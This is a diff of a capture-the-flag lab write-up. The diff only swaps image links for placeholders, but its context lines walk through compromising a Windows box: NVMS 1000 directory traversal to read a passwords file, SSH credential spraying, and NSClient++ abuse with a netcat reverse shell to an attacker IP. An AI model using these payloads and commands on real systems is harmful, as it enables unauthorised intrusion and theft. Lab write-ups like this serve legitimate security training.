@@ -25,9 +25,9 @@ export target=10.129.227.77
 sudo nmap -p- --min-rate 1000 -sT -vvv $target
 ```
 
-<img width="442" height="52" alt="image" src="https://github.com/user-attachments/assets/4529f5ac-4895-4efa-bdfd-3247e29bc87a" />
+<img width="442" height="52" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
-<img width="501" height="583" alt="image" src="https://github.com/user-attachments/assets/88162d64-b53a-4ba8-89dc-373f78834caf" />
+<img width="501" height="583" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
 **Discovered Ports:**
 - 21/tcp    - FTP
@@ -50,14 +50,14 @@ Detailed service version detection and script scanning:
 sudo nmap -sC -sV -p 21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 -T4 $target
 ```
 
-<img width="899" height="960" alt="image" src="https://github.com/user-attachments/assets/9fed10f7-a881-4cc2-9896-b0acf2725743" />
+<img width="899" height="960" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 
 **Key Findings:**
 - FTP service allowing anonymous login
 - HTTP service running NVMS 1000 software
 
-<img width="870" height="755" alt="image" src="https://github.com/user-attachments/assets/f0f11c09-b57b-4ef0-8591-34d74c13a759" />
+<img width="870" height="755" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 - Multiple Windows-specific services indicating a Windows host
 
@@ -108,7 +108,7 @@ http://10.129.227.77/Pages/login.htm
 searchsploit 'nvms 1000'
 ```
 
-<img width="954" height="174" alt="image" src="https://github.com/user-attachments/assets/928a5f3c-0c5f-47b6-8bbc-3e2dddffdae7" />
+<img width="954" height="174" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
 **Identified Exploits:**
 - Directory Traversal vulnerability (CVE-2019-20085)
@@ -120,7 +120,7 @@ Using the directory traversal vulnerability to access sensitive files:
 
 **Initial request**
 
-<img width="455" height="444" alt="image" src="https://github.com/user-attachments/assets/6007c19e-9107-488f-876c-c7db62044b6e" />
+<img width="455" height="444" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
 **HTTP Request:**
 ```http
@@ -128,7 +128,7 @@ GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
 Host: 10.129.227.77
 ```
 
-<img width="960" height="521" alt="image" src="https://github.com/user-attachments/assets/df0a5810-9b4f-41ff-96a7-85b70c3ddd4b" />
+<img width="960" height="521" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
 **Modified to access user files:**
 ```http
@@ -136,7 +136,7 @@ GET /../../../../../../../../../../../../users/nathan/desktop/passwords.txt HTTP
 Host: 10.129.227.77
 ```
 
-<img width="924" height="447" alt="image" src="https://github.com/user-attachments/assets/f2c71966-6ea8-436e-93a7-89ae03d38ee8" />
+<img width="924" height="447" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
 **Retrieved Credentials:**
 ```
@@ -165,7 +165,7 @@ administrator
 crackmapexec ssh 10.129.227.77 -u users.txt -p pass.txt --continue-on-success
 ```
 
-<img width="947" height="457" alt="image" src="https://github.com/user-attachments/assets/d8a180df-d587-43f7-80ef-799962876545" />
+<img width="947" height="457" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
 **Successful Authentication:**
 - Username: `nadine`
@@ -177,7 +177,7 @@ crackmapexec ssh 10.129.227.77 -u users.txt -p pass.txt --continue-on-success
 ssh nadine@10.129.227.77
 ```
 
-<img width="566" height="686" alt="image" src="https://github.com/user-attachments/assets/4d1a95e5-a835-4fad-bef0-2200e027f322" />
+<img width="566" height="686" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
 **User Flag:**
 ```cmd
@@ -206,7 +206,7 @@ nscp web --password --display
 Current password: ew2x6SsGTxjRwXOT
 ```
 
-<img width="606" height="73" alt="image" src="https://github.com/user-attachments/assets/84cd64f5-4b29-4d57-b3b9-d71a18758d56" />
+<img width="606" height="73" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 ### Exploitation Strategy
 
@@ -223,7 +223,7 @@ Based on research from Exploit-DB (46802), NSClient++ allows execution of extern
    echo C:\programdata\nc.exe -e cmd.exe 10.10.14.106 4444 > C:\programdata\exploit.bat
    ```
 
-<img width="809" height="700" alt="image" src="https://github.com/user-attachments/assets/970b68ab-1529-438e-a9d2-8eb4d29cc729" />
+<img width="809" height="700" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
 2. **Setup Listener:**
    ```bash
@@ -233,25 +233,25 @@ Based on research from Exploit-DB (46802), NSClient++ allows execution of extern
 3. **Configure NSClient++ Script:**
    - login
 
-<img width="888" height="529" alt="image" src="https://github.com/user-attachments/assets/02e6804f-8c9a-4d45-bc94-7ec138e9c939" />
+<img width="888" height="529" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
    - Navigate to Settings > External Scripts > Scripts
    - Add new script named "foobar"
    - Command: `c:\programdata\exploit.bat`
    - Save configuration and reload service
 
-<img width="832" height="390" alt="image" src="https://github.com/user-attachments/assets/10cdc450-bb71-4fa0-8fb4-215ec7568af7" />
+<img width="832" height="390" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />
 
-<img width="493" height="154" alt="image" src="https://github.com/user-attachments/assets/f33a4575-fa6d-41fa-87bc-a89b392e1abb" />
+<img width="493" height="154" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />
 
 4. **Execute Script:**
    - Access `https://127.0.0.1:8443/index.html#/queries/foobar`
 
-<img width="1345" height="505" alt="image" src="https://github.com/user-attachments/assets/54bca5d4-6aa4-4235-b085-3fd37b89836b" />
+<img width="1345" height="505" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />
 
    - Click "Run" to execute the script
 
-<img width="1336" height="318" alt="image" src="https://github.com/user-attachments/assets/e1690900-0b55-4d96-9428-de210f647bf2" />
+<img width="1336" height="318" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur" />
 
 
 ### Root Access
@@ -265,7 +265,7 @@ type C:\Users\Administrator\Desktop\root.txt
 8490b03644b0b4c76d393cc428dd230b
 ```
 
-<img width="582" height="769" alt="image" src="https://github.com/user-attachments/assets/b7430f26-24df-4b5d-9a90-b56f9788410d" />
+<img width="582" height="769" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-18-Upload-To-Imgur" />
 
 ## Lessons Learned
 
